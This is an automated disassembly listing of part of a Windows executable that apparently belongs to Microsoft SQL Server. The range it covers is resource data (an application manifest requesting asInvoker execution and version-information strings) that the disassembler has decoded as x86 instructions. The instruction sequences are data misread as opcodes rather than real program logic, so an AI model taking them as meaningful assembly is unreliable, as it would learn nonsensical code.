  4063eb:	cmp    al,0x72
  4063ed:	gs jno 0x406465
  4063f0:	gs jae 0x406467
  4063f3:	gs fs push eax
  4063f6:	jb     0x406461
  4063f8:	jbe    0x406463
  4063fa:	ins    BYTE PTR es:[edi],dx
  4063fb:	gs addr16 gs jae 0x40643e
  406400:	or     eax,0x2020200a
  406405:	and    BYTE PTR [eax],ah
  406407:	and    BYTE PTR [eax],ah
  406409:	and    BYTE PTR [edx+esi*2],bh
  40640c:	gs jno 0x406484
  40640f:	gs jae 0x406486
  406412:	gs fs inc ebp
  406415:	js     0x40647c
  406417:	arpl   WORD PTR [ebp+0x74],si
  40641a:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  406421:	ins    BYTE PTR es:[edi],dx
  406422:	or     eax,0x2020200a
  406427:	and    BYTE PTR [eax],ah
  406429:	and    BYTE PTR [eax],ah
  40642b:	and    BYTE PTR [eax],ah
  40642d:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  406431:	gs ins BYTE PTR es:[edi],dx
  406433:	cmp    eax,0x49736122
  406438:	outs   dx,BYTE PTR ds:[esi]
  406439:	jbe    0x4064aa
  40643b:	imul   esp,DWORD PTR [ebp+0x72],0x22
  40643f:	or     eax,0x2020200a
  406444:	and    BYTE PTR [eax],ah
  406446:	and    BYTE PTR [eax],ah
  406448:	and    BYTE PTR [eax],ah
  40644a:	and    BYTE PTR [ebp+0x69],dh
  40644d:	inc    ecx
  40644e:	arpl   WORD PTR [ebx+0x65],sp
  406451:	jae    0x4064c6
  406453:	cmp    eax,0x6c616622
  406458:	jae    0x4064bf
  40645a:	and    ch,BYTE PTR [edi]
  40645c:	ds or  eax,0x2020200a
  406462:	and    BYTE PTR [eax],ah
  406464:	and    BYTE PTR [eax],ah
  406466:	and    BYTE PTR [edi+ebp*1],bh
  406469:	jb     0x4064d0
  40646b:	jno    0x4064e2
  40646d:	gs jae 0x4064e4
  406470:	gs fs push eax
  406473:	jb     0x4064de
  406475:	jbe    0x4064e0
  406477:	ins    BYTE PTR es:[edi],dx
  406478:	gs addr16 gs jae 0x4064bb
  40647d:	or     eax,0x2020200a
  406482:	and    BYTE PTR [eax],ah
  406484:	and    BYTE PTR [eax],ah
  406486:	cmp    al,0x2f
  406488:	jae    0x4064ef
  40648a:	arpl   WORD PTR [ebp+0x72],si
  40648d:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  406495:	cmp    al,0x2f
  406497:	je     0x40650b
  406499:	jne    0x40650e
  40649b:	je     0x4064e6
  40649d:	outs   dx,BYTE PTR ds:[esi]
  40649e:	outs   dx,WORD PTR ds:[esi]
  4064a0:	ds or  eax,0x612f3c0a
  4064a6:	jae    0x40651b
  4064a8:	gs ins DWORD PTR es:[edi],dx
  4064aa:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  4064ae:	or     eax,0x3404880a
  4064b3:	add    BYTE PTR [eax],al
  4064b5:	add    BYTE PTR [esi+0x0],dl
  4064b8:	push   ebx
  4064b9:	add    BYTE PTR [edi+0x0],bl
  4064bc:	push   esi
  4064bd:	add    BYTE PTR [ebp+0x0],al
  4064c0:	push   edx
  4064c1:	add    BYTE PTR [ebx+0x0],dl
  4064c4:	dec    ecx
  4064c5:	add    BYTE PTR [edi+0x0],cl
  4064c8:	dec    esi
  4064c9:	add    BYTE PTR [edi+0x0],bl
  4064cc:	dec    ecx
  4064cd:	add    BYTE PTR [esi+0x0],cl
  4064d0:	inc    esi
  4064d1:	add    BYTE PTR [edi+0x0],cl
  4064d4:	add    BYTE PTR [eax],al
  4064d6:	add    BYTE PTR [eax],al
  4064d8:	mov    ebp,0xfeef04
  4064dd:	add    BYTE PTR [ecx],al
  4064df:	add    BYTE PTR [eax],al
  4064e1:	add    BYTE PTR [ebx],cl
  4064e3:	add    BYTE PTR [eax+eax*1],bh
  4064e6:	xor    al,0x8
  4064e8:	add    BYTE PTR [eax],al
  4064ea:	or     eax,DWORD PTR [eax]
  4064ec:	cmp    al,0x0
  4064ee:	xor    al,0x8
  4064f0:	aas    
  4064f1:	add    BYTE PTR [eax],al
  4064f3:	add    BYTE PTR [eax],cl
  4064f5:	add    BYTE PTR [eax],al
  4064f7:	add    BYTE PTR [eax],al
  4064f9:	add    BYTE PTR [eax+eax*1],al
  4064fc:	add    DWORD PTR [eax],eax
	...
  40650a:	add    BYTE PTR [eax],al
  40650c:	out    0x3,al
  40650e:	add    BYTE PTR [eax],al
  406510:	add    DWORD PTR [eax],eax
  406512:	push   ebx
  406513:	add    BYTE PTR [eax+eax*1+0x72],dh
  406517:	add    BYTE PTR [ecx+0x0],ch
  40651a:	outs   dx,BYTE PTR ds:[esi]
  40651b:	add    BYTE PTR [edi+0x0],ah
  40651e:	inc    esi
  40651f:	add    BYTE PTR [ecx+0x0],ch
  406522:	ins    BYTE PTR es:[edi],dx
  406523:	add    BYTE PTR [ebp+0x0],ah
  406526:	dec    ecx
  406527:	add    BYTE PTR [esi+0x0],ch
  40652a:	data16 add BYTE PTR [edi+0x0],ch
  40652e:	add    BYTE PTR [eax],al
  406530:	ret    0x3
  406533:	add    BYTE PTR [ecx],al
  406535:	add    BYTE PTR [eax],dh
  406537:	add    BYTE PTR [eax+eax*1],dh
  40653a:	xor    BYTE PTR [eax],al
  40653c:	cmp    DWORD PTR [eax],eax
  40653e:	xor    BYTE PTR [eax],al
  406540:	xor    al,0x0
  406542:	inc    edx
  406543:	add    BYTE PTR [eax],dh
  406545:	add    BYTE PTR [eax],al
  406547:	add    BYTE PTR [edx],dh
  406549:	add    BYTE PTR ds:0x50000100,cl
  40654f:	add    BYTE PTR [eax+eax*1+0x61],ch
  406553:	add    BYTE PTR [eax+eax*1+0x66],dh
  406557:	add    BYTE PTR [edi+0x0],ch
  40655a:	jb     0x40655c
  40655c:	ins    DWORD PTR es:[edi],dx
  40655d:	add    BYTE PTR [eax],al
  40655f:	add    BYTE PTR [esi+0x0],cl
  406562:	push   esp
  406563:	add    BYTE PTR [eax],ah
  406565:	add    BYTE PTR [ecx+0x0],cl
  406568:	dec    esi
  406569:	add    BYTE PTR [eax+eax*1+0x45],dl
  40656d:	add    BYTE PTR [eax+eax*1+0x20],cl
  406571:	add    BYTE PTR [eax+0x0],bl
  406574:	cmp    BYTE PTR [eax],al
  406576:	add    BYTE PTR ss:[eax],al
  406579:	add    BYTE PTR [eax],al
  40657b:	add    BYTE PTR [edx+0x1004900],bh
  406581:	add    BYTE PTR [eax+eax*1+0x65],cl
  406585:	add    BYTE PTR [edi+0x0],ah
  406588:	popa   
  406589:	add    BYTE PTR [eax+eax*1+0x54],ch
  40658d:	add    BYTE PTR [edx+0x0],dh
  406590:	popa   
  406591:	add    BYTE PTR [eax+eax*1+0x65],ah
  406595:	add    BYTE PTR [ebp+0x0],ch
  406598:	popa   
  406599:	add    BYTE PTR [edx+0x0],dh
  40659c:	imul   eax,DWORD PTR [eax],0x73
  40659f:	add    BYTE PTR [eax],al
  4065a1:	add    BYTE PTR [eax],al
  4065a3:	add    BYTE PTR [ebp+0x0],cl
  4065a6:	imul   eax,DWORD PTR [eax],0x720063
  4065ac:	outs   dx,DWORD PTR ds:[esi]
  4065ad:	add    BYTE PTR [ebx+0x0],dh
  4065b0:	outs   dx,DWORD PTR ds:[esi]
  4065b1:	add    BYTE PTR [esi+0x0],ah
  4065b4:	je     0x4065b6
  4065b6:	and    BYTE PTR [eax],al
  4065b8:	push   ebx
  4065b9:	add    BYTE PTR [ecx+0x0],dl
  4065bc:	dec    esp
  4065bd:	add    BYTE PTR [eax],ah
  4065bf:	add    BYTE PTR [ebx+0x0],dl
  4065c2:	add    BYTE PTR gs:[edx+0x0],dh
  4065c6:	jbe    0x4065c8
  4065c8:	add    BYTE PTR gs:[edx+0x0],dh
  4065cc:	and    BYTE PTR [eax],al
  4065ce:	imul   eax,DWORD PTR [eax],0x200073
  4065d4:	popa   
  4065d5:	add    BYTE PTR [eax],ah
  4065d7:	add    BYTE PTR [edx+0x0],dh
  4065da:	add    BYTE PTR gs:[edi+0x0],ah
  4065de:	imul   eax,DWORD PTR [eax],0x740073
  4065e4:	add    BYTE PTR gs:[edx+0x0],dh
  4065e8:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  4065ed:	add    BYTE PTR [eax+eax*1+0x72],dh
  4065f1:	add    BYTE PTR [ecx+0x0],ah
  4065f4:	add    BYTE PTR fs:[ebp+0x0],ah
  4065f8:	ins    DWORD PTR es:[edi],dx
  4065f9:	add    BYTE PTR [ecx+0x0],ah
  4065fc:	jb     0x4065fe
  4065fe:	imul   eax,DWORD PTR [eax],0x20
  406601:	add    BYTE PTR [edi+0x0],ch
  406604:	data16 add BYTE PTR [eax],ah
  406607:	add    BYTE PTR [ebp+0x0],cl
  40660a:	imul   eax,DWORD PTR [eax],0x720063
  406610:	outs   dx,DWORD PTR ds:[esi]
  406611:	add    BYTE PTR [ebx+0x0],dh
  406614:	outs   dx,DWORD PTR ds:[esi]
  406615:	add    BYTE PTR [esi+0x0],ah
  406618:	je     0x40661a
  40661a:	and    BYTE PTR [eax],al
  40661c:	inc    ebx
  40661d:	add    BYTE PTR [edi+0x0],ch
  406620:	jb     0x406622
  406622:	jo     0x406624
  406624:	outs   dx,DWORD PTR ds:[esi]
  406625:	add    BYTE PTR [edx+0x0],dh
  406628:	popa   
  406629:	add    BYTE PTR [eax+eax*1+0x69],dh
  40662d:	add    BYTE PTR [edi+0x0],ch
  406630:	outs   dx,BYTE PTR ds:[esi]
  406631:	add    BYTE PTR [esi],ch
  406633:	add    BYTE PTR [eax],al
  406635:	add    BYTE PTR [eax],al
  406637:	add    BYTE PTR [eax],ah
  406639:	add    BYTE PTR [eax+eax*1],al
  40663c:	add    DWORD PTR [eax],eax
  40663e:	inc    ebx
  40663f:	add    BYTE PTR [edi+0x0],ch
  406642:	ins    DWORD PTR es:[edi],dx
  406643:	add    BYTE PTR [ebp+0x0],ch
  406646:	add    BYTE PTR gs:[esi+0x0],ch
  40664a:	je     0x40664c
  40664c:	jae    0x40664e
  40664e:	add    BYTE PTR [eax],al
  406650:	push   ebx
  406651:	add    BYTE PTR [ecx+0x0],dl
  406654:	dec    esp
  406655:	add    BYTE PTR [eax],al
  406657:	add    BYTE PTR [esi],ah
  406659:	add    BYTE PTR ds:0x47000100,al
  40665f:	add    BYTE PTR [edi+0x0],ch
  406662:	ins    BYTE PTR es:[edi],dx
  406663:	add    BYTE PTR [eax+eax*1+0x65],ah
  406667:	add    BYTE PTR [esi+0x0],ch
  40666a:	inc    edx
  40666b:	add    BYTE PTR [ecx+0x0],ch
  40666e:	je     0x406670
  406670:	jae    0x406672
  406672:	add    BYTE PTR [eax],al
  406674:	push   esp
  406675:	add    BYTE PTR [edx+0x0],dh
  406678:	jne    0x40667a
  40667a:	add    BYTE PTR gs:[eax],al
  40667d:	add    BYTE PTR [eax],al
  40667f:	add    BYTE PTR [eax+eax*1+0x16],cl
  406683:	add    BYTE PTR [ecx],al
  406685:	add    BYTE PTR [ebx+0x0],al
  406688:	outs   dx,DWORD PTR ds:[esi]
  406689:	add    BYTE PTR [ebp+0x0],ch
  40668c:	jo     0x40668e
  40668e:	popa   
  40668f:	add    BYTE PTR [esi+0x0],ch
  406692:	jns    0x406694
  406694:	dec    esi
  406695:	add    BYTE PTR [ecx+0x0],ah
  406698:	ins    DWORD PTR es:[edi],dx
  406699:	add    BYTE PTR [ebp+0x0],ah
  40669c:	add    BYTE PTR [eax],al
  40669e:	add    BYTE PTR [eax],al
  4066a0:	dec    ebp
  4066a1:	add    BYTE PTR [ecx+0x0],ch
  4066a4:	arpl   WORD PTR [eax],ax
  4066a6:	jb     0x4066a8
  4066a8:	outs   dx,DWORD PTR ds:[esi]
  4066a9:	add    BYTE PTR [ebx+0x0],dh
  4066ac:	outs   dx,DWORD PTR ds:[esi]
  4066ad:	add    BYTE PTR [esi+0x0],ah
  4066b0:	je     0x4066b2
  4066b2:	and    BYTE PTR [eax],al
  4066b4:	inc    ebx
  4066b5:	add    BYTE PTR [edi+0x0],ch
  4066b8:	jb     0x4066ba
  4066ba:	jo     0x4066bc
  4066bc:	outs   dx,DWORD PTR ds:[esi]
  4066bd:	add    BYTE PTR [edx+0x0],dh
  4066c0:	popa   
  4066c1:	add    BYTE PTR [eax+eax*1+0x69],dh
  4066c5:	add    BYTE PTR [edi+0x0],ch
  4066c8:	outs   dx,BYTE PTR ds:[esi]
  4066c9:	add    BYTE PTR [eax],al
  4066cb:	add    BYTE PTR [eax+eax*1+0x16],dl
  4066cf:	add    BYTE PTR [ecx],al
  4066d1:	add    BYTE PTR [esi+0x0],al
  4066d4:	imul   eax,DWORD PTR [eax],0x65006c
  4066da:	inc    esp
  4066db:	add    BYTE PTR [ebp+0x0],ah
  4066de:	jae    0x4066e0
  4066e0:	arpl   WORD PTR [eax],ax
  4066e2:	jb     0x4066e4
  4066e4:	imul   eax,DWORD PTR [eax],0x740070
  4066ea:	imul   eax,DWORD PTR [eax],0x6e006f
  4066f0:	add    BYTE PTR [eax],al
  4066f2:	add    BYTE PTR [eax],al
  4066f4:	push   ebx
  4066f5:	add    BYTE PTR [ecx+0x0],dl
  4066f8:	dec    esp
  4066f9:	add    BYTE PTR [eax],ah
  4066fb:	add    BYTE PTR [ebx+0x0],dl
  4066fe:	add    BYTE PTR gs:[edx+0x0],dh
  406702:	jbe    0x406704
  406704:	add    BYTE PTR gs:[edx+0x0],dh
  406708:	and    BYTE PTR [eax],al
  40670a:	push   eax
  40670b:	add    BYTE PTR [edi+0x0],ch
  40670e:	ja     0x406710
  406710:	add    BYTE PTR gs:[edx+0x0],dh
  406714:	push   ebx
  406715:	add    BYTE PTR [eax+0x0],ch
  406718:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  40671d:	add    BYTE PTR [eax],al
  40671f:	add    BYTE PTR [eax+0x0],dh
  406722:	sub    BYTE PTR [eax],al
  406724:	add    DWORD PTR [eax],eax
  406726:	inc    esi
  406727:	add    BYTE PTR [ecx+0x0],ch
  40672a:	ins    BYTE PTR es:[edi],dx
  40672b:	add    BYTE PTR [ebp+0x0],ah
  40672e:	push   esi
  40672f:	add    BYTE PTR [ebp+0x0],ah
  406732:	jb     0x406734
  406734:	jae    0x406736
  406736:	imul   eax,DWORD PTR [eax],0x6e006f
  40673c:	add    BYTE PTR [eax],al
  40673e:	add    BYTE PTR [eax],al
  406740:	xor    DWORD PTR [eax],eax
  406742:	xor    DWORD PTR [eax],eax
  406744:	add    BYTE PTR cs:[eax],dh
  406747:	add    BYTE PTR [esi],ch
  406749:	add    BYTE PTR [edx],dh
  40674b:	add    BYTE PTR [ecx],dh
  40674d:	add    BYTE PTR [eax],dh
  40674f:	add    BYTE PTR [eax],dh
  406751:	add    BYTE PTR [esi],ch
  406753:	add    BYTE PTR [esi],dh
  406755:	add    BYTE PTR [eax],dh
  406757:	add    BYTE PTR [eax],ah
  406759:	add    BYTE PTR [eax],ch
  40675b:	add    BYTE PTR [eax],ch
  40675d:	add    BYTE PTR [ebx+0x0],dl
  406760:	push   ecx
  406761:	add    BYTE PTR [eax+eax*1+0x31],cl
  406765:	add    BYTE PTR [ecx],dh
  406767:	add    BYTE PTR [edi+0x0],bl
  40676a:	push   edx
  40676b:	add    BYTE PTR [eax+eax*1+0x4d],dl
  40676f:	add    BYTE PTR [ecx],ch
  406771:	add    BYTE PTR [esi],ch
  406773:	add    BYTE PTR [ecx],dh
  406775:	add    BYTE PTR [edx],dh
  406777:	add    BYTE PTR [eax],dh
  406779:	add    BYTE PTR [edx],dh
  40677b:	add    BYTE PTR [ecx],dh
  40677d:	add    BYTE PTR [eax],dh
  40677f:	add    BYTE PTR ds:0x38003100,ch
  406785:	add    BYTE PTR [eax+eax*1],dh
  406788:	add    BYTE PTR ss:[eax],ah
  40678b:	add    BYTE PTR [ecx],ch
  40678d:	add    BYTE PTR [eax],al
  40678f:	add    BYTE PTR [eax+eax*1],ch
  406792:	push   es
  406793:	add    BYTE PTR [ecx],al
  406795:	add    BYTE PTR [ecx+0x0],cl
  406798:	outs   dx,BYTE PTR ds:[esi]
  406799:	add    BYTE PTR [eax+eax*1+0x65],dh
  40679d:	add    BYTE PTR [edx+0x0],dh
  4067a0:	outs   dx,BYTE PTR ds:[esi]
  4067a1:	add    BYTE PTR [ecx+0x0],ah
  4067a4:	ins    BYTE PTR es:[edi],dx
  4067a5:	add    BYTE PTR [esi+0x0],cl
  4067a8:	popa   
  4067a9:	add    BYTE PTR [ebp+0x0],ch
  4067ac:	add    BYTE PTR gs:[eax],al
  4067af:	add    BYTE PTR [ebx+0x0],dl
  4067b2:	push   ecx
  4067b3:	add    BYTE PTR [eax+eax*1+0x50],cl
  4067b7:	add    BYTE PTR [ebx+0x0],dl
  4067ba:	add    BYTE PTR [eax],al
  4067bc:	outs   dx,BYTE PTR ds:[esi]
  4067bd:	add    BYTE PTR ds:0x4c000100,ah
  4067c3:	add    BYTE PTR [ebp+0x0],ah
  4067c6:	add    BYTE PTR [bx+di+0x0],ah
  4067ca:	ins    BYTE PTR es:[edi],dx
  4067cb:	add    BYTE PTR [ebx+0x0],al
  4067ce:	outs   dx,DWORD PTR ds:[esi]
  4067cf:	add    BYTE PTR [eax+0x0],dh
  4067d2:	jns    0x4067d4
  4067d4:	jb     0x4067d6
  4067d6:	imul   eax,DWORD PTR [eax],0x680067
  4067dc:	je     0x4067de
  4067de:	add    BYTE PTR [eax],al
  4067e0:	dec    ebp
  4067e1:	add    BYTE PTR [ecx+0x0],ch
  4067e4:	arpl   WORD PTR [eax],ax
  4067e6:	jb     0x4067e8
  4067e8:	outs   dx,DWORD PTR ds:[esi]
  4067e9:	add    BYTE PTR [ebx+0x0],dh
  4067ec:	outs   dx,DWORD PTR ds:[esi]
  4067ed:	add    BYTE PTR [esi+0x0],ah
  4067f0:	je     0x4067f2
  4067f2:	and    BYTE PTR [eax],al
  4067f4:	inc    ebx
  4067f5:	add    BYTE PTR [edi+0x0],ch
  4067f8:	jb     0x4067fa
  4067fa:	jo     0x4067fc
  4067fc:	add    BYTE PTR cs:[eax],ah
  4067ff:	add    BYTE PTR [ecx+0x0],al
  406802:	ins    BYTE PTR es:[edi],dx
  406803:	add    BYTE PTR [eax+eax*1+0x20],ch
  406807:	add    BYTE PTR [edx+0x0],dh
  40680a:	imul   eax,DWORD PTR [eax],0x680067
  406810:	je     0x406812
  406812:	jae    0x406814
  406814:	and    BYTE PTR [eax],al
  406816:	jb     0x406818
  406818:	add    BYTE PTR gs:[ebx+0x0],dh
  40681c:	add    BYTE PTR gs:[edx+0x0],dh
  406820:	jbe    0x406822
  406822:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  406827:	add    BYTE PTR [eax],al
  406829:	add    BYTE PTR [eax],al
  40682b:	add    BYTE PTR [eax+eax*1],bh
  40682e:	or     al,BYTE PTR [eax]
  406830:	add    DWORD PTR [eax],eax
  406832:	dec    edi
  406833:	add    BYTE PTR [edx+0x0],dh
  406836:	imul   eax,DWORD PTR [eax],0x690067
  40683c:	outs   dx,BYTE PTR ds:[esi]
  40683d:	add    BYTE PTR [ecx+0x0],ah
  406840:	ins    BYTE PTR es:[edi],dx
  406841:	add    BYTE PTR [esi+0x0],al
  406844:	imul   eax,DWORD PTR [eax],0x65006c
  40684a:	outs   dx,BYTE PTR ds:[esi]
  40684b:	add    BYTE PTR [ecx+0x0],ah
  40684e:	ins    DWORD PTR es:[edi],dx
  40684f:	add    BYTE PTR [ebp+0x0],ah
  406852:	add    BYTE PTR [eax],al
  406854:	push   ebx
  406855:	add    BYTE PTR [ecx+0x0],dl
  406858:	dec    esp
  406859:	add    BYTE PTR [eax+0x0],dl
  40685c:	push   ebx
  40685d:	add    BYTE PTR [esi],ch
  40685f:	add    BYTE PTR [ebp+0x0],al
  406862:	pop    eax
  406863:	add    BYTE PTR [ebp+0x0],al
  406866:	add    BYTE PTR [eax],al
  406868:	dec    edx
  406869:	add    BYTE PTR ds:0x50000100,dl
  40686f:	add    BYTE PTR [edx+0x0],dh
  406872:	outs   dx,DWORD PTR ds:[esi]
  406873:	add    BYTE PTR [eax+eax*1+0x75],ah
  406877:	add    BYTE PTR [ebx+0x0],ah
  40687a:	je     0x40687c
  40687c:	dec    esi
  40687d:	add    BYTE PTR [ecx+0x0],ah
  406880:	ins    DWORD PTR es:[edi],dx
  406881:	add    BYTE PTR [ebp+0x0],ah
  406884:	add    BYTE PTR [eax],al
  406886:	add    BYTE PTR [eax],al
  406888:	dec    ebp
  406889:	add    BYTE PTR [ecx+0x0],ch
  40688c:	arpl   WORD PTR [eax],ax
  40688e:	jb     0x406890
  406890:	outs   dx,DWORD PTR ds:[esi]
  406891:	add    BYTE PTR [ebx+0x0],dh
  406894:	outs   dx,DWORD PTR ds:[esi]
  406895:	add    BYTE PTR [esi+0x0],ah
  406898:	je     0x40689a
  40689a:	and    BYTE PTR [eax],al
  40689c:	push   ebx
  40689d:	add    BYTE PTR [ecx+0x0],dl
  4068a0:	dec    esp
  4068a1:	add    BYTE PTR [eax],ah
  4068a3:	add    BYTE PTR [ebx+0x0],dl
  4068a6:	add    BYTE PTR gs:[edx+0x0],dh
  4068aa:	jbe    0x4068ac
  4068ac:	add    BYTE PTR gs:[edx+0x0],dh
  4068b0:	add    BYTE PTR [eax],al
  4068b2:	add    BYTE PTR [eax],al
  4068b4:	add    BYTE PTR ds:0x50000100,cl
  4068bb:	add    BYTE PTR [edx+0x0],dh
  4068be:	outs   dx,DWORD PTR ds:[esi]
  4068bf:	add    BYTE PTR [eax+eax*1+0x75],ah
  4068c3:	add    BYTE PTR [ebx+0x0],ah
  4068c6:	je     0x4068c8
  4068c8:	push   esi
  4068c9:	add    BYTE PTR [ebp+0x0],ah
  4068cc:	jb     0x4068ce
  4068ce:	jae    0x4068d0
  4068d0:	imul   eax,DWORD PTR [eax],0x6e006f
  4068d6:	add    BYTE PTR [eax],al
  4068d8:	xor    DWORD PTR [eax],eax
  4068da:	xor    DWORD PTR [eax],eax
  4068dc:	add    BYTE PTR cs:[eax],dh
  4068df:	add    BYTE PTR [esi],ch
  4068e1:	add    BYTE PTR [edx],dh
  4068e3:	add    BYTE PTR [ecx],dh
  4068e5:	add    BYTE PTR [eax],dh
  4068e7:	add    BYTE PTR [eax],dh
  4068e9:	add    BYTE PTR [esi],ch
  4068eb:	add    BYTE PTR [esi],dh
  4068ed:	add    BYTE PTR [eax],dh
  4068ef:	add    BYTE PTR [eax],al
  4068f1:	add    BYTE PTR [eax],al
  4068f3:	add    BYTE PTR [eax+eax*1+0x0],al
  4068f7:	add    BYTE PTR [ecx],al
  4068f9:	add    BYTE PTR [esi+0x0],dl
  4068fc:	popa   
  4068fd:	add    BYTE PTR [edx+0x0],dh
  406900:	inc    esi
  406901:	add    BYTE PTR [ecx+0x0],ch
  406904:	ins    BYTE PTR es:[edi],dx
  406905:	add    BYTE PTR [ebp+0x0],ah
  406908:	dec    ecx
  406909:	add    BYTE PTR [esi+0x0],ch
  40690c:	data16 add BYTE PTR [edi+0x0],ch
  406910:	add    BYTE PTR [eax],al
  406912:	add    BYTE PTR [eax],al
  406914:	and    al,0x0
  406916:	add    al,0x0
  406918:	add    BYTE PTR [eax],al
  40691a:	push   esp
  40691b:	add    BYTE PTR [edx+0x0],dh
  40691e:	popa   
  40691f:	add    BYTE PTR [esi+0x0],ch
  406922:	jae    0x406924
  406924:	ins    BYTE PTR es:[edi],dx
  406925:	add    BYTE PTR [ecx+0x0],ah
  406928:	je     0x40692a
  40692a:	imul   eax,DWORD PTR [eax],0x6e006f
  406930:	add    BYTE PTR [eax],al
  406932:	add    BYTE PTR [eax],al
  406934:	or     DWORD PTR [eax+esi*4],eax
  406937:	add    al,0x28
  406939:	add    BYTE PTR [eax],al
  40693b:	add    BYTE PTR [eax],dh
  40693d:	add    BYTE PTR [eax],al
  40693f:	add    BYTE PTR [eax+0x0],ah
  406942:	add    BYTE PTR [eax],al
  406944:	add    DWORD PTR [eax],eax
  406946:	or     BYTE PTR [eax],al
  406948:	add    BYTE PTR [eax],al
  40694a:	add    BYTE PTR [eax],al
  40694c:	add    BYTE PTR [ecx],cl
	...
  406956:	add    BYTE PTR [eax],al
  406958:	add    BYTE PTR [ecx],al
  40695a:	add    BYTE PTR [eax],al
  40695c:	add    BYTE PTR [ecx],al
  40695e:	add    BYTE PTR [eax],al
  406960:	add    BYTE PTR [eax],al
  406962:	add    BYTE PTR [eax],al
  406964:	push   ebp
  406965:	je     0x4069df
  406967:	add    BYTE PTR [edx+0x74],ah
  40696a:	outs   dx,BYTE PTR ds:[esi]
  40696b:	add    BYTE PTR [ebx-0x61ffda91],bl
  406971:	jo     0x406998
  406973:	add    BYTE PTR [esi-0x41ffda94],bh
  406979:	ins    BYTE PTR es:[edi],dx
  40697a:	sub    BYTE PTR [eax],al
  40697c:	mov    eax,ds:0xad002773
  406981:	jne    0x4069aa
  406983:	add    BYTE PTR [edx-0x5cffda85],ch
  406989:	jbe    0x4069b6
  40698b:	add    BYTE PTR [ecx-0x59ffd78a],ch
  406991:	jp     0x4069bb
  406993:	add    BYTE PTR [esi+edi*2+0x76b3002b],ch
  40699a:	daa    
  40699b:	add    BYTE PTR [esi-0x41ffd789],dh
  4069a1:	ja     0x4069cc
  4069a3:	add    BYTE PTR [eax+edi*2+0x7ea10029],bh
  4069aa:	xor    al,BYTE PTR [eax]
  4069ac:	shr    BYTE PTR [esi+0x25],0x0
  4069b0:	ret    
  4069b1:	jb     0x4069d9
  4069b3:	add    bh,al
  4069b5:	jns    0x4069dc
  4069b7:	add    cl,cl
  4069b9:	jl     0x4069e1
  4069bb:	add    cl,al
  4069bd:	jb     0x4069e7
  4069bf:	add    ch,al
  4069c1:	jns    0x4069ed
  4069c3:	add    cl,cl
  4069c5:	jge    0x4069f3
  4069c7:	add    al,al
  4069c9:	jae    0x4069fd
  4069cb:	add    ah,al
  4069cd:	jns    0x406a00
  4069cf:	add    dh,al
  4069d1:	jl     0x406a10
  4069d3:	add    BYTE PTR [ecx-0x7a],dh
  4069d6:	arpl   WORD PTR [eax],ax
  4069d8:	scas   al,BYTE PTR es:[edi]
  4069d9:	sub    DWORD PTR [ebx],0x2582b500
  4069df:	add    BYTE PTR [edx-0x4dffd87c],bh
  4069e5:	test   BYTE PTR [ebx],ch
  4069e7:	add    BYTE PTR [ebp-0x4bffd179],bh
  4069ed:	mov    BYTE PTR ds:0x2b89bb00,ch
  4069f3:	add    BYTE PTR [ecx-0x53ffc980],ah
  4069f9:	xor    BYTE PTR [esi],0x0
  4069fc:	lods   eax,DWORD PTR ds:[esi]
  4069fd:	test   BYTE PTR [ebx],bh
  4069ff:	add    BYTE PTR [edx-0x4affcb7a],dh
  406a05:	mov    DWORD PTR [ebx],esi
  406a07:	add    BYTE PTR [ecx-0x4dffce76],bh
  406a0d:	xchg   DWORD PTR [ecx],edi
  406a0f:	add    BYTE PTR [esi-0x43ffc377],dh
  406a15:	xchg   edx,eax
  406a16:	aaa    
  406a17:	add    ah,cl
  406a19:	and    DWORD PTR [esi],0x0
  406a1c:	ror    BYTE PTR [ebx-0x7d38ffd9],0x2f
  406a23:	add    ah,cl
  406a25:	sub    BYTE PTR [ebx],0x0
  406a28:	ror    BYTE PTR [edi-0x7731ffd4],0x2d
  406a2f:	add    cl,dl
  406a31:	mov    ch,BYTE PTR [eax]
  406a33:	add    dh,al
  406a35:	xchg   edx,eax
  406a36:	sub    eax,DWORD PTR [eax]
  406a38:	rcl    DWORD PTR [ecx-0x7a39ffd5],cl
  406a3e:	xor    al,BYTE PTR [eax]
  406a40:	ret    
  406a41:	mov    dh,BYTE PTR [edx]
  406a43:	add    dh,cl
  406a45:	lea    esi,[ecx]
  406a47:	add    cl,al
  406a49:	xchg   ebx,eax
  406a4a:	xor    eax,DWORD PTR [eax]
  406a4c:	(bad)  
  406a4d:	cdq    
  406a4e:	xor    eax,DWORD PTR [eax]
  406a50:	int3   
  406a51:	call   0x3e:0x9cc60031
  406a58:	enter  0x3c9a,0x0
  406a5c:	rcl    DWORD PTR [esi-0x5f33ffca],cl
  406a62:	cmp    eax,0x3aa3d200
  406a67:	add    BYTE PTR [esi-0x73ffb77a],dl
  406a6d:	adc    BYTE PTR [edi+0x0],0x9b
  406a71:	mov    WORD PTR [edx+0x0],ss
  406a74:	lods   eax,DWORD PTR ds:[esi]
  406a75:	xchg   DWORD PTR [eax+0x0],eax
  406a78:	mov    ah,0x8d
  406a7a:	inc    ebp
  406a7b:	add    BYTE PTR [edx-0x43ffb971],bh
  406a81:	xchg   ebp,eax
  406a82:	inc    eax
  406a83:	add    BYTE PTR [esi-0x43ffbf68],bh
  406a89:	xchg   esp,eax
  406a8a:	dec    edx
  406a8b:	add    BYTE PTR [edx+edx*4-0x6a47ffab],dh
  406a92:	push   ecx
  406a93:	add    BYTE PTR [ebp-0x4dffaa68],bh
  406a99:	xchg   ebx,eax
  406a9a:	pop    esp
  406a9b:	add    BYTE PTR [esi-0x6dffa062],bh
  406aa1:	xchg   ecx,eax
  406aa2:	popa   
  406aa3:	add    BYTE PTR [edi+ebx*4-0x626eff82],cl
  406aaa:	ja     0x406aac
  406aac:	mov    dl,0x96
  406aae:	popa   
  406aaf:	add    BYTE PTR [ecx+ebx*4-0x6140ff99],dh
  406ab6:	bound  eax,QWORD PTR [eax]
  406ab8:	mov    edx,0xb5006f9f
  406abd:	popf   
  406abe:	jo     0x406ac0
  406ac0:	mov    esp,0xbc006ea0
  406ac5:	mov    eax,ds:0xa2b70070
  406aca:	jns    0x406acc
  406acc:	mov    eax,0xcf007fa4
  406ad1:	mov    WORD PTR [eax+0x0],es
  406ad4:	leave  
  406ad5:	test   BYTE PTR [edx+0x0],cl
